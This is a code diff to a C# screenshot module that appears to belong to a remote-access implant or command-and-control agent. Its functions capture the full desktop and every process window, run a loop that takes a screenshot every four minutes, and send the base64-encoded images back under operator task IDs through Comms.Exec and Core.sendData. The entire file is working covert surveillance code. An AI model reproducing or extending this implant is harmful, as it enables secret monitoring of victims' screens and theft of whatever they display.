@@ -1,8 +1,7 @@
 ﻿using System;
 using System.Drawing;
 using System.IO;
-using System.Linq;
-using System.Reflection;
+using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -13,7 +12,7 @@ namespace Core.Host
         internal static int screenshotInterval = 240000;
         internal static bool screenshotEnabled = false;
 
-        internal static void GetScreenshot(int width = 0, int height = 0, string taskId = null)
+        internal static void GetScreenshot(int width = 0, int height = 0)
         {
             try
             {
@@ -23,23 +22,17 @@ namespace Core.Host
                     height = SystemInformation.VirtualScreen.Height;
                 }
 
-                if (string.IsNullOrEmpty(taskId))
-                {
-                    taskId = Common.Comms.GetTaskId();
-                }
-
                 var bitmap = new Bitmap(width, height);
                 var graphics = Graphics.FromImage(bitmap);
                 var size = new Size(width, height);
                 graphics.CopyFromScreen(0, 0, 0, 0, size);
                 var imageMemoryStream = new MemoryStream();
                 bitmap.Save(imageMemoryStream, System.Drawing.Imaging.ImageFormat.Png);
-
-                Common.Comms.Exec(Convert.ToBase64String(imageMemoryStream.ToArray()), null, taskId);
+                Console.WriteLine(Convert.ToBase64String(imageMemoryStream.ToArray()));
             }
             catch (Exception e)
             {
-                Console.WriteLine($"[-] Cannot perform screen capture: {e.Message}\n");
+                Console.WriteLine($"[-] Cannot perform screen capture: {e}\n");
             }
         }
 
@@ -59,30 +52,21 @@ namespace Core.Host
             }
         }
 
-        internal static void ScreenshotAllWindows(string taskId = null)
+        internal static void ScreenshotAllWindows()
         {
             try
             {
-                if (string.IsNullOrEmpty(taskId))
-                {
-                    taskId = Common.Comms.GetTaskId();
-                }
-
                 var processes = System.Diagnostics.Process.GetProcesses();
                 foreach (var p in processes)
                 {
                     try
                     {
                         var windowHandle = p.MainWindowHandle;
-                        var screenshotAssembly = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "Screenshot");
-                        var sOut = screenshotAssembly?.GetType("WindowStation").InvokeMember("CaptureCSSingle",
-                            BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null,
-                            new object[] {windowHandle}).ToString();
-                        Common.Comms.Exec(sOut, null, taskId);
+                        Core.sendData(Core.getCurrentTaskId(), Encoding.UTF8.GetBytes(WindowStation.CaptureCSSingle(windowHandle)));
                     }
                     catch (Exception e)
                     {
-                        Console.Write($"[-] Error taking screenshot of all windows: {e.Message}");
+                        Console.Write("[-] Error taking screenshot of all windows: " + e.Message);
                     }
                 }
             }
@@ -96,20 +80,19 @@ namespace Core.Host
         {
             try
             {
-                var taskId = Common.Comms.GetTaskId();
-                ThreadPool.QueueUserWorkItem((_) =>
+                ThreadPool.QueueUserWorkItem(_ =>
                 {
                     try
                     {
                         while (screenshotEnabled)
                         {
-                            GetScreenshot(width, height, taskId);
+                            GetScreenshot(width, height);
                             Thread.Sleep(screenshotInterval);
                         }
                     }
                     catch (Exception e)
                     {
-                        Console.Write($"[-] Error taking multi-screenshot: {e.Message}");
+                        Console.Write("[-] Error taking multi-screenshot: " + e.Message);
                     }
                 });
             }
